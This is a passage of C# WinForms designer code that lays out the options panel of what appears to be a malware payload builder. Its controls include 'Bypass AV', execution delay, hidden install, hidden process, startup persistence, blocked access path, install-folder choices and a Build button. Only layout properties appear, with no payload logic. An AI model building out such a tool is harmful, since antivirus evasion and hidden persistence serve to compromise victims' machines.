        this.BaypassAV.OnHoverUnchecked.BorderRadius = 6;
        this.BaypassAV.OnHoverUnchecked.BorderThickness = 1;
        this.BaypassAV.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BaypassAV.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BaypassAV.OnUncheck.BorderRadius = 6;
        this.BaypassAV.OnUncheck.BorderThickness = 1;
        this.BaypassAV.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BaypassAV.Size = new System.Drawing.Size(21, 21);
        this.BaypassAV.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BaypassAV.TabIndex = 642;
        this.BaypassAV.ThreeState = false;
        this.BaypassAV.ToolTipText = null;
        // 
        // label28
        // 
        this.label28.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label28.AutoSize = true;
        this.label28.BackColor = System.Drawing.Color.Transparent;
        this.label28.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label28.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.label28.ForeColor = System.Drawing.Color.Black;
        this.label28.Location = new System.Drawing.Point(397, 371);
        this.label28.Name = "label28";
        this.label28.Size = new System.Drawing.Size(60, 15);
        this.label28.TabIndex = 641;
        this.label28.Text = "Bypass AV";
        // 
        // Build
        // 
        this.Build.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
        this.Build.Animated = true;
        this.Build.BorderRadius = 2;
        this.Build.CheckedState.Parent = this.Build;
        this.Build.CustomImages.Parent = this.Build;
        this.Build.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.Build.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.Build.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.Build.ForeColor = System.Drawing.Color.White;
        this.Build.HoverState.Parent = this.Build;
        this.Build.Location = new System.Drawing.Point(766, 378);
        this.Build.Name = "Build";
        this.Build.ShadowDecoration.Parent = this.Build;
        this.Build.Size = new System.Drawing.Size(98, 27);
        this.Build.TabIndex = 640;
        this.Build.Text = "Build";
        this.Build.Click += new System.EventHandler(this.Build_Click);
        // 
        // pictureBox1
        // 
        this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
        this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
        this.pictureBox1.Location = new System.Drawing.Point(696, 37);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(203, 160);
        this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.pictureBox1.TabIndex = 639;
        this.pictureBox1.TabStop = false;
        // 
        // BuilderDelay
        // 
        this.BuilderDelay.AllowBindingControlAnimation = true;
        this.BuilderDelay.AllowBindingControlColorChanges = false;
        this.BuilderDelay.AllowBindingControlLocation = true;
        this.BuilderDelay.AllowCheckBoxAnimation = true;
        this.BuilderDelay.AllowCheckmarkAnimation = true;
        this.BuilderDelay.AllowOnHoverStates = true;
        this.BuilderDelay.AutoCheck = true;
        this.BuilderDelay.BackColor = System.Drawing.Color.Transparent;
        this.BuilderDelay.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderDelay.BackgroundImage")));
        this.BuilderDelay.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderDelay.BindingControl = this.TxExDelay;
        this.BuilderDelay.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderDelay.BorderRadius = 6;
        this.BuilderDelay.Checked = false;
        this.BuilderDelay.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderDelay.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderDelay.CustomCheckmarkImage = null;
        this.BuilderDelay.Location = new System.Drawing.Point(373, 71);
        this.BuilderDelay.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderDelay.Name = "BuilderDelay";
        this.BuilderDelay.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDelay.OnCheck.BorderRadius = 6;
        this.BuilderDelay.OnCheck.BorderThickness = 2;
        this.BuilderDelay.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDelay.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderDelay.OnCheck.CheckmarkThickness = 2;
        this.BuilderDelay.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderDelay.OnDisable.BorderRadius = 6;
        this.BuilderDelay.OnDisable.BorderThickness = 2;
        this.BuilderDelay.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderDelay.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderDelay.OnDisable.CheckmarkThickness = 2;
        this.BuilderDelay.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderDelay.OnHoverChecked.BorderRadius = 6;
        this.BuilderDelay.OnHoverChecked.BorderThickness = 2;
        this.BuilderDelay.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderDelay.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderDelay.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderDelay.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderDelay.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderDelay.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderDelay.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderDelay.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderDelay.OnUncheck.BorderRadius = 6;
        this.BuilderDelay.OnUncheck.BorderThickness = 1;
        this.BuilderDelay.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderDelay.Size = new System.Drawing.Size(21, 21);
        this.BuilderDelay.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderDelay.TabIndex = 628;
        this.BuilderDelay.ThreeState = false;
        this.BuilderDelay.ToolTipText = null;
        this.BuilderDelay.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(this.BuilderDelay_CheckedChanged);
        // 
        // TxExDelay
        // 
        this.TxExDelay.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxExDelay.AutoSize = true;
        this.TxExDelay.BackColor = System.Drawing.Color.Transparent;
        this.TxExDelay.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxExDelay.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxExDelay.ForeColor = System.Drawing.Color.Black;
        this.TxExDelay.Location = new System.Drawing.Point(397, 75);
        this.TxExDelay.Name = "TxExDelay";
        this.TxExDelay.Size = new System.Drawing.Size(91, 15);
        this.TxExDelay.TabIndex = 627;
        this.TxExDelay.Text = "Execution Delay";
        // 
        // InsPanel
        // 
        this.InsPanel.Controls.Add(this.TxTemplates);
        this.InsPanel.Controls.Add(this.BuilderTemplates);
        this.InsPanel.Controls.Add(this.TxApplacation);
        this.InsPanel.Controls.Add(this.BuilderApplicationData);
        this.InsPanel.Controls.Add(this.TxUserProfil);
        this.InsPanel.Controls.Add(this.BuilderBloackAccessPath);
        this.InsPanel.Controls.Add(this.BuilderUserProfile);
        this.InsPanel.Controls.Add(this.TxBlockPath);
        this.InsPanel.Controls.Add(this.BuilderProcessName);
        this.InsPanel.Controls.Add(this.Foldername);
        this.InsPanel.Controls.Add(this.BuilderHiddenInstall);
        this.InsPanel.Controls.Add(this.TxHiddenInstall);
        this.InsPanel.Controls.Add(this.TxHiddenProcess);
        this.InsPanel.Controls.Add(this.AutoStartup);
        this.InsPanel.Controls.Add(this.HiddenProcess);
        this.InsPanel.Controls.Add(this.TxStartup);
        this.InsPanel.Enabled = false;
        this.InsPanel.Location = new System.Drawing.Point(362, 104);
        this.InsPanel.Name = "InsPanel";
        this.InsPanel.Size = new System.Drawing.Size(327, 176);
        this.InsPanel.TabIndex = 625;
        // 
        // TxTemplates
        // 
        this.TxTemplates.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxTemplates.AutoSize = true;
        this.TxTemplates.BackColor = System.Drawing.Color.Transparent;
        this.TxTemplates.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxTemplates.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxTemplates.ForeColor = System.Drawing.Color.Black;
        this.TxTemplates.Location = new System.Drawing.Point(251, 52);
        this.TxTemplates.Name = "TxTemplates";
        this.TxTemplates.Size = new System.Drawing.Size(60, 15);
        this.TxTemplates.TabIndex = 626;
        this.TxTemplates.Text = "Templates";
        // 
        // BuilderTemplates
        // 
        this.BuilderTemplates.AllowBindingControlLocation = false;
        this.BuilderTemplates.BackColor = System.Drawing.Color.Transparent;
        this.BuilderTemplates.BindingControl = this.TxTemplates;
        this.BuilderTemplates.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.BuilderTemplates.BorderThickness = 1;
        this.BuilderTemplates.Checked = false;
        this.BuilderTemplates.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderTemplates.Location = new System.Drawing.Point(227, 50);
        this.BuilderTemplates.Name = "BuilderTemplates";
        this.BuilderTemplates.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderTemplates.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderTemplates.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.BuilderTemplates.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderTemplates.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderTemplates.Size = new System.Drawing.Size(21, 21);
        this.BuilderTemplates.TabIndex = 625;
        this.BuilderTemplates.Text = null;
        // 
        // TxApplacation
        // 
        this.TxApplacation.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxApplacation.AutoSize = true;
        this.TxApplacation.BackColor = System.Drawing.Color.Transparent;
        this.TxApplacation.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxApplacation.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxApplacation.ForeColor = System.Drawing.Color.Black;
        this.TxApplacation.Location = new System.Drawing.Point(129, 52);
        this.TxApplacation.Name = "TxApplacation";
        this.TxApplacation.Size = new System.Drawing.Size(92, 15);
        this.TxApplacation.TabIndex = 624;
        this.TxApplacation.Text = "ApplicationData";
        // 
        // BuilderApplicationData
        // 
        this.BuilderApplicationData.AllowBindingControlLocation = false;
        this.BuilderApplicationData.BackColor = System.Drawing.Color.Transparent;
        this.BuilderApplicationData.BindingControl = this.TxApplacation;
        this.BuilderApplicationData.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.BuilderApplicationData.BorderThickness = 1;
        this.BuilderApplicationData.Checked = false;
        this.BuilderApplicationData.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderApplicationData.Location = new System.Drawing.Point(105, 50);
        this.BuilderApplicationData.Name = "BuilderApplicationData";
        this.BuilderApplicationData.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderApplicationData.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderApplicationData.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.BuilderApplicationData.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderApplicationData.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderApplicationData.Size = new System.Drawing.Size(21, 21);
        this.BuilderApplicationData.TabIndex = 623;
        this.BuilderApplicationData.Text = null;
        // 
        // TxUserProfil
        // 
        this.TxUserProfil.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxUserProfil.AutoSize = true;
        this.TxUserProfil.BackColor = System.Drawing.Color.Transparent;
        this.TxUserProfil.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxUserProfil.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxUserProfil.ForeColor = System.Drawing.Color.Black;
        this.TxUserProfil.Location = new System.Drawing.Point(35, 52);
        this.TxUserProfil.Name = "TxUserProfil";
        this.TxUserProfil.Size = new System.Drawing.Size(64, 15);
        this.TxUserProfil.TabIndex = 622;
        this.TxUserProfil.Text = "UserProfile";
        // 
        // BuilderBloackAccessPath
        // 
        this.BuilderBloackAccessPath.AllowBindingControlAnimation = true;
        this.BuilderBloackAccessPath.AllowBindingControlColorChanges = false;
        this.BuilderBloackAccessPath.AllowBindingControlLocation = true;
        this.BuilderBloackAccessPath.AllowCheckBoxAnimation = true;
        this.BuilderBloackAccessPath.AllowCheckmarkAnimation = true;
        this.BuilderBloackAccessPath.AllowOnHoverStates = true;
        this.BuilderBloackAccessPath.AutoCheck = true;
        this.BuilderBloackAccessPath.BackColor = System.Drawing.Color.Transparent;
        this.BuilderBloackAccessPath.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderBloackAccessPath.BackgroundImage")));
        this.BuilderBloackAccessPath.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.BuilderBloackAccessPath.BindingControl = this.TxBlockPath;
        this.BuilderBloackAccessPath.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.BuilderBloackAccessPath.BorderRadius = 6;
        this.BuilderBloackAccessPath.Checked = false;
        this.BuilderBloackAccessPath.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Unchecked;
        this.BuilderBloackAccessPath.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderBloackAccessPath.CustomCheckmarkImage = null;
        this.BuilderBloackAccessPath.Location = new System.Drawing.Point(171, 149);
        this.BuilderBloackAccessPath.MinimumSize = new System.Drawing.Size(17, 17);
        this.BuilderBloackAccessPath.Name = "BuilderBloackAccessPath";
        this.BuilderBloackAccessPath.OnCheck.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderBloackAccessPath.OnCheck.BorderRadius = 6;
        this.BuilderBloackAccessPath.OnCheck.BorderThickness = 2;
        this.BuilderBloackAccessPath.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderBloackAccessPath.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderBloackAccessPath.OnCheck.CheckmarkThickness = 2;
        this.BuilderBloackAccessPath.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.BuilderBloackAccessPath.OnDisable.BorderRadius = 6;
        this.BuilderBloackAccessPath.OnDisable.BorderThickness = 2;
        this.BuilderBloackAccessPath.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderBloackAccessPath.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.BuilderBloackAccessPath.OnDisable.CheckmarkThickness = 2;
        this.BuilderBloackAccessPath.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderBloackAccessPath.OnHoverChecked.BorderRadius = 6;
        this.BuilderBloackAccessPath.OnHoverChecked.BorderThickness = 2;
        this.BuilderBloackAccessPath.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderBloackAccessPath.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.BuilderBloackAccessPath.OnHoverChecked.CheckmarkThickness = 2;
        this.BuilderBloackAccessPath.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderBloackAccessPath.OnHoverUnchecked.BorderRadius = 6;
        this.BuilderBloackAccessPath.OnHoverUnchecked.BorderThickness = 1;
        this.BuilderBloackAccessPath.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.BuilderBloackAccessPath.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.BuilderBloackAccessPath.OnUncheck.BorderRadius = 6;
        this.BuilderBloackAccessPath.OnUncheck.BorderThickness = 1;
        this.BuilderBloackAccessPath.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.BuilderBloackAccessPath.Size = new System.Drawing.Size(21, 21);
        this.BuilderBloackAccessPath.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.BuilderBloackAccessPath.TabIndex = 637;
        this.BuilderBloackAccessPath.ThreeState = false;
        this.BuilderBloackAccessPath.ToolTipText = null;
        // 
        // TxBlockPath
        // 
        this.TxBlockPath.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.TxBlockPath.AutoSize = true;
        this.TxBlockPath.BackColor = System.Drawing.Color.Transparent;
        this.TxBlockPath.Cursor = System.Windows.Forms.Cursors.Hand;
        this.TxBlockPath.Font = new System.Drawing.Font("Segoe UI", 9F);
        this.TxBlockPath.ForeColor = System.Drawing.Color.Black;
        this.TxBlockPath.Location = new System.Drawing.Point(195, 153);
        this.TxBlockPath.Name = "TxBlockPath";
        this.TxBlockPath.Size = new System.Drawing.Size(105, 15);
        this.TxBlockPath.TabIndex = 636;
        this.TxBlockPath.Text = "Block Access Path ";
        // 
        // BuilderUserProfile
        // 
        this.BuilderUserProfile.AllowBindingControlLocation = false;
        this.BuilderUserProfile.BackColor = System.Drawing.Color.Transparent;
        this.BuilderUserProfile.BindingControl = this.TxUserProfil;
        this.BuilderUserProfile.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.BuilderUserProfile.BorderThickness = 1;
        this.BuilderUserProfile.Checked = true;
        this.BuilderUserProfile.Cursor = System.Windows.Forms.Cursors.Hand;
        this.BuilderUserProfile.Location = new System.Drawing.Point(11, 50);
        this.BuilderUserProfile.Name = "BuilderUserProfile";
        this.BuilderUserProfile.OutlineColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderUserProfile.OutlineColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderUserProfile.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.BuilderUserProfile.RadioColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderUserProfile.RadioColorTabFocused = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderUserProfile.Size = new System.Drawing.Size(21, 21);
        this.BuilderUserProfile.TabIndex = 621;
        this.BuilderUserProfile.Text = null;
        // 
        // BuilderProcessName
        // 
        this.BuilderProcessName.AcceptsReturn = false;
        this.BuilderProcessName.AcceptsTab = false;
        this.BuilderProcessName.AnimationSpeed = 200;
        this.BuilderProcessName.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.BuilderProcessName.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.BuilderProcessName.AutoSizeHeight = true;
        this.BuilderProcessName.BackColor = System.Drawing.Color.Transparent;
        this.BuilderProcessName.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("BuilderProcessName.BackgroundImage")));
        this.BuilderProcessName.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.BuilderProcessName.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.BuilderProcessName.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.BuilderProcessName.BorderColorIdle = System.Drawing.Color.Silver;
        this.BuilderProcessName.BorderRadius = 2;
        this.BuilderProcessName.BorderThickness = 1;
        this.BuilderProcessName.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.BuilderProcessName.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.BuilderProcessName.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderProcessName.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.BuilderProcessName.DefaultText = "";
        this.BuilderProcessName.FillColor = System.Drawing.Color.White;
        this.BuilderProcessName.HideSelection = true;
        this.BuilderProcessName.IconLeft = null;
        this.BuilderProcessName.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderProcessName.IconPadding = 10;
        this.BuilderProcessName.IconRight = null;
        this.BuilderProcessName.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.BuilderProcessName.Lines = new string[0];
        this.BuilderProcessName.Location = new System.Drawing.Point(11, 82);
        this.BuilderProcessName.MaxLength = 32767;
        this.BuilderProcessName.MinimumSize = new System.Drawing.Size(1, 1);
        this.BuilderProcessName.Modified = false;
        this.BuilderProcessName.Multiline = false;
        this.BuilderProcessName.Name = "BuilderProcessName";
        stateProperties77.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties77.FillColor = System.Drawing.Color.Empty;
        stateProperties77.ForeColor = System.Drawing.Color.Empty;
        stateProperties77.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderProcessName.OnActiveState = stateProperties77;
        stateProperties78.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties78.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties78.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties78.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.BuilderProcessName.OnDisabledState = stateProperties78;
        stateProperties79.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties79.FillColor = System.Drawing.Color.Empty;
        stateProperties79.ForeColor = System.Drawing.Color.Empty;
        stateProperties79.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderProcessName.OnHoverState = stateProperties79;
        stateProperties80.BorderColor = System.Drawing.Color.Silver;
        stateProperties80.FillColor = System.Drawing.Color.White;
        stateProperties80.ForeColor = System.Drawing.Color.Empty;
        stateProperties80.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.BuilderProcessName.OnIdleState = stateProperties80;
        this.BuilderProcessName.Padding = new System.Windows.Forms.Padding(3);
        this.BuilderProcessName.PasswordChar = '\0';
        this.BuilderProcessName.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.BuilderProcessName.PlaceholderText = "Process name";
        this.BuilderProcessName.ReadOnly = false;
        this.BuilderProcessName.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.BuilderProcessName.SelectedText = "";
        this.BuilderProcessName.SelectionLength = 0;
        this.BuilderProcessName.SelectionStart = 0;
        this.BuilderProcessName.ShortcutsEnabled = true;
        this.BuilderProcessName.Size = new System.Drawing.Size(309, 28);
        this.BuilderProcessName.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.BuilderProcessName.TabIndex = 626;
        this.BuilderProcessName.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.BuilderProcessName.TextMarginBottom = 0;
        this.BuilderProcessName.TextMarginLeft = 3;
        this.BuilderProcessName.TextMarginTop = 1;
        this.BuilderProcessName.TextPlaceholder = "Process name";
        this.BuilderProcessName.UseSystemPasswordChar = false;
        this.BuilderProcessName.WordWrap = true;
        // 
        // Foldername
        // 
        this.Foldername.AcceptsReturn = false;
        this.Foldername.AcceptsTab = false;
        this.Foldername.AnimationSpeed = 200;
        this.Foldername.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Foldername.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.Foldername.AutoSizeHeight = true;
        this.Foldername.BackColor = System.Drawing.Color.Transparent;
        this.Foldername.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("Foldername.BackgroundImage")));
        this.Foldername.BorderColorActive = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        this.Foldername.BorderColorDisabled = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        this.Foldername.BorderColorHover = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        this.Foldername.BorderColorIdle = System.Drawing.Color.Silver;
        this.Foldername.BorderRadius = 2;
        this.Foldername.BorderThickness = 1;
        this.Foldername.CharacterCase = Bunifu.UI.WinForms.BunifuTextBox.CharacterCases.Normal;
        this.Foldername.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.Foldername.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.Foldername.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25F);
        this.Foldername.DefaultText = "";
        this.Foldername.FillColor = System.Drawing.Color.White;
        this.Foldername.HideSelection = true;
        this.Foldername.IconLeft = null;
        this.Foldername.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.Foldername.IconPadding = 10;
        this.Foldername.IconRight = null;
        this.Foldername.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.Foldername.Lines = new string[0];
        this.Foldername.Location = new System.Drawing.Point(11, 10);
        this.Foldername.MaxLength = 32767;
        this.Foldername.MinimumSize = new System.Drawing.Size(1, 1);
        this.Foldername.Modified = false;
        this.Foldername.Multiline = false;
        this.Foldername.Name = "Foldername";
        stateProperties81.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(87)))), ((int)(((byte)(59)))), ((int)(((byte)(255)))));
        stateProperties81.FillColor = System.Drawing.Color.Empty;
        stateProperties81.ForeColor = System.Drawing.Color.Empty;
        stateProperties81.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Foldername.OnActiveState = stateProperties81;
        stateProperties82.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(204)))), ((int)(((byte)(204)))), ((int)(((byte)(204)))));
        stateProperties82.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
        stateProperties82.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(109)))), ((int)(((byte)(109)))), ((int)(((byte)(109)))));
        stateProperties82.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.Foldername.OnDisabledState = stateProperties82;
        stateProperties83.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(192)))), ((int)(((byte)(128)))));
        stateProperties83.FillColor = System.Drawing.Color.Empty;
        stateProperties83.ForeColor = System.Drawing.Color.Empty;
        stateProperties83.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Foldername.OnHoverState = stateProperties83;
        stateProperties84.BorderColor = System.Drawing.Color.Silver;
        stateProperties84.FillColor = System.Drawing.Color.White;
        stateProperties84.ForeColor = System.Drawing.Color.Empty;
        stateProperties84.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.Foldername.OnIdleState = stateProperties84;
        this.Foldername.Padding = new System.Windows.Forms.Padding(3);
        this.Foldername.PasswordChar = '\0';
        this.Foldername.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.Foldername.PlaceholderText = "Folder name";
        this.Foldername.ReadOnly = false;
        this.Foldername.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.Foldername.SelectedText = "";
        this.Foldername.SelectionLength = 0;
        this.Foldername.SelectionStart = 0;
        this.Foldername.ShortcutsEnabled = true;
        this.Foldername.Size = new System.Drawing.Size(309, 28);
        this.Foldername.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
